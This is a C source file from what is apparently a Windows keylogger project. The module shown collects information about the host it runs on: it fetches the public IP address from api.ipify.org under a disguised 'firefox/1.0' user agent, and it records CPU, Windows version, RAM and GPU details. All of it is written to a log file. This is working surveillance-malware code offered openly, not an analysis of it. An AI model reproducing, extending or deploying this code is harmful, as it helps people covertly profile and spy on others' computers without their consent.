#include "keylogger.h"

void	get_ip_address(void)
{
	HINTERNET hSession = WinHttpOpen(L"firefox/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

	if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
		WinHttpReceiveResponse(hRequest, NULL)) {
		char buffer[256];
		char buff[256];
		DWORD bytesRead;
		if (WinHttpReadData(hRequest, buffer, sizeof(buffer)-1, &bytesRead)) {
			buffer[bytesRead] = '\0';
			snprintf(buff, sizeof(buff), "Public IP Address: %s\n", buffer);
			write_to_file(buff);
		}
	}

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
}

const char* get_arch_name(WORD arch)
{
	// Return the architecture name based on the processor architecture by using windows defines
	switch (arch)
	{
		case PROCESSOR_ARCHITECTURE_INTEL:			return "Intel (x86)";
		case PROCESSOR_ARCHITECTURE_MIPS:			return "MIPS";
		case PROCESSOR_ARCHITECTURE_ALPHA:			return "Alpha";
		case PROCESSOR_ARCHITECTURE_PPC:			return "PowerPC";
		case PROCESSOR_ARCHITECTURE_SHX:			return "SHX";
		case PROCESSOR_ARCHITECTURE_ARM:			return "ARM";
		case PROCESSOR_ARCHITECTURE_IA64:			return "Intel Itanium";
		case PROCESSOR_ARCHITECTURE_ALPHA64:		return "Alpha64";
		case PROCESSOR_ARCHITECTURE_MSIL:			return "MSIL";
		case PROCESSOR_ARCHITECTURE_AMD64:			return "AMD64 (x64)";
		case PROCESSOR_ARCHITECTURE_IA32_ON_WIN64:	return "IA32 on Win64";
		case PROCESSOR_ARCHITECTURE_NEUTRAL:		return "Neutral";
		case PROCESSOR_ARCHITECTURE_ARM64:			return "ARM64";
		case PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64:	return "ARM32 on Win64";
		case PROCESSOR_ARCHITECTURE_IA32_ON_ARM64:	return "IA32 on ARM64";
		case PROCESSOR_ARCHITECTURE_UNKNOWN:		return "Unknown";
		default:									return "Unknown (undefined)";
	}
}

void get_cpu_info(void)
{
	// Get CPU vendor and model information using __cpuid intrinsic
	int cpuInfoData[4] = {0};
	char vendor[13] = {0};

	// Get the CPU vendor string
	__cpuid(cpuInfoData, 0);
	*((int*)vendor) = cpuInfoData[1];
	*((int*)(vendor + 4)) = cpuInfoData[3];
	*((int*)(vendor + 8)) = cpuInfoData[2];

	char modelInfo[256] = {0};

	int modelData[4] = {0};
	char brand[49] = {0};

	// Get the CPU brand string
	__cpuid(modelData, 0x80000002);
	memcpy(brand, modelData, 16);

	__cpuid(modelData, 0x80000003);
	memcpy(brand + 16, modelData, 16);

	__cpuid(modelData, 0x80000004);
	memcpy(brand + 32, modelData, 16);
	brand[48] = '\0';

	snprintf(modelInfo, sizeof(modelInfo), "CPU Vendor: %s\nCPU Model: %s\n", vendor, brand);
	write_to_file(modelInfo);

	// Get CPU information using  Arch and number of processors
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	char cpuInfo[256];
	snprintf(cpuInfo, sizeof(cpuInfo), "CPU Architecture: %s\nNombre de coeur: %lu\n",
				 get_arch_name(sysInfo.wProcessorArchitecture),
				(unsigned long)sysInfo.dwNumberOfProcessors);
	write_to_file(cpuInfo);
}

void get_windows_info(void)
{
	// Define the structure for RtlGetVersion
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (hMod)
	{
		// Define the function pointer type for RtlGetVersion
		void* pFn = (void*)GetProcAddress(hMod, "RtlGetVersion");
		if (pFn)
		{
			// Cast the function pointer to the correct type
			RtlGetVersionPtr fn = (RtlGetVersionPtr)pFn;
			RTL_OSVERSIONINFOW rovi;
			ZeroMemory(&rovi, sizeof(rovi));
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (fn(&rovi) == 0)
			{
				char versionInfo[256];
				snprintf(versionInfo, sizeof(versionInfo),
						 "Windows version: %ld.%ld (build %ld)\n",
						 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
				write_to_file(versionInfo);
				return;
			}
		}
	}
	write_logs("Impossible de récupérer la version de Windows\n");
	write_to_file("Impossible de récupérer la version de Windows\n");
}

void get_ram_info(void)
{
	// Get the total physical memory using GlobalMemoryStatusEx
	MEMORYSTATUSEX status;
	status.dwLength = sizeof(status);
	GlobalMemoryStatusEx(&status);
	char ramInfo[256];
	snprintf(ramInfo, sizeof(ramInfo), "RAM: %llu MB\n", status.ullTotalPhys / (1024 * 1024));
	write_to_file(ramInfo);
}
// Define GUIDs for DXGI interfaces cause windows sucks
#define INITGUID

#ifndef __IID_DEFINED__
#define __IID_DEFINED__
typedef struct _IID {
    unsigned long  x;
    unsigned short s1;
    unsigned short s2;
    unsigned char  c[8];
} IID;
#endif

DEFINE_GUID(IID_IDXGIFactory,
  0x7b7166ec, 0x21c7, 0x44ae, 0xb2, 0x1a, 0xc9, 0xae, 0x32, 0x1a, 0xe3, 0x69);

void get_gpu_info(void)
{
	IDXGIFactory *pFactory = NULL;
	HRESULT hr = CreateDXGIFactory(&IID_IDXGIFactory, (void **)&pFactory);
	if (FAILED(hr) || !pFactory) {
		write_to_file("Impossible de récupérer les informations GPU\n");
		return;
	}

	for (UINT i = 0; ; ++i) {
		IDXGIAdapter *pAdapter = NULL;
		hr = pFactory->lpVtbl->EnumAdapters(pFactory, i, &pAdapter);
		if (FAILED(hr) || !pAdapter)
			break;

		DXGI_ADAPTER_DESC desc;
		if (SUCCEEDED(pAdapter->lpVtbl->GetDesc(pAdapter, &desc))) {
			char name[256];
			WideCharToMultiByte( CP_UTF8, 0, desc.Description, -1, name, sizeof(name), NULL, NULL);

			char line[320];
			snprintf(line, sizeof(line), "GPU %u: %s\n", i, name);
			write_to_file(line);
		}

		pAdapter->lpVtbl->Release(pAdapter);
	}

	pFactory->lpVtbl->Release(pFactory);
}
